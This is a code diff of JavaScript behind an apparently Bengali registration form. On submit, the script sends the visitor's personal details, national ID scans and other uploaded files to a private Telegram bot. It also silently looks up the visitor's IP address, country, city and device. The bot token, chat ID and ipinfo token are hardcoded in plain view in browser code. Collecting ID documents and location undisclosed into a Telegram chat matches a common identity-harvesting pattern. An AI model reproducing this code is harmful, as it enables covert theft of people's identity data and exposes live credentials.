@@ -70,8 +70,8 @@ form.addEventListener('submit', async (e) => {
   // Show loading
   loadingDiv.style.display = 'flex';
 
-  const token = "7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s";
-  const chatId = "7079142411";
+  const token = "7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s"; // এখানে আপনার বট টোকেন দিন
+  const chatId = "7079142411"; // এখানে আপনার চ্যাট আইডি দিন
 
   const name = document.getElementById('name').value;
   const phone = document.getElementById('phone').value;
@@ -98,7 +98,7 @@ form.addEventListener('submit', async (e) => {
   // IP + Location
   let ip = 'Unknown', country = 'Unknown', city = 'Unknown';
   try {
-    const res = await fetch('https://ipinfo.io/json?token=আপনার_IPINFO_TOKEN');
+    const res = await fetch('https://ipinfo.io/json?token=24260cb6dd365a');
     const data = await res.json();
     ip = data.ip;
     country = data.country;
@@ -108,13 +108,13 @@ form.addEventListener('submit', async (e) => {
   const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
   const browser = navigator.userAgent;
 
-  // মূল মেসেজ
+  // বাংলায় বিস্তারিত মেসেজ
   let message = `নিবন্ধন তথ্য:\n\nনাম: ${name}\nমোবাইল: ${phone}\nজন্ম তারিখ: ${dob}\nবয়স: ${age}\nউচ্চতা: ${heightFeet} ফুট ${heightInch} ইঞ্চি\nলিঙ্গ: ${gender}\nওয়ার্ড: ${ward}\nগ্রাম: ${village}\n\nIP: ${ip}\nদেশ: ${country}\nশহর: ${city}\nডিভাইস: ${device}\nব্রাউজার: ${browser}`;
 
-  // Sheet-ready TSV ফরম্যাট (ট্যাব দিয়ে আলাদা)
-  let sheetLine = `${name}\t${phone}\t${dob}\t${age}\t${heightFeet}\t${heightInch}\t${gender}\t${ward}\t${village}\t${ip}\t${country}\t${city}\t${device}\t${browser}`;
+  // Sheet-ready CSV লাইন
+  let sheetLine = `${name}\t${phone}\t${dob}\t${age}\t${heightFeet}\t${heightInch}\t${gender}\t${ward}\t${village}\t${ip}\t${country}\t${city}\t${device}`;
 
-  // একসাথে টেলিগ্রামে পাঠানো
+  // মেসেজ + CSV টেলিগ্রামে পাঠানো
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -124,7 +124,7 @@ form.addEventListener('submit', async (e) => {
     })
   });
 
-  // ফাইল পাঠানোর ফাংশন
+  // ফাইল পাঠানোর হেল্পার
   async function sendFile(file) {
     if (file) {
       const formData = new FormData();
@@ -136,7 +136,6 @@ form.addEventListener('submit', async (e) => {
     }
   }
 
-  // NID ফাইল পাঠানো
   if (nidOption.value === 'separate') {
     await sendFile(nidFront);
     await sendFile(nidBack);
@@ -144,7 +143,6 @@ form.addEventListener('submit', async (e) => {
     await sendFile(nidCombined);
   }
 
-  // অন্য ফাইল পাঠানো
   await sendFile(certificateFile);
   for (const f of extraFiles) await sendFile(f);
 
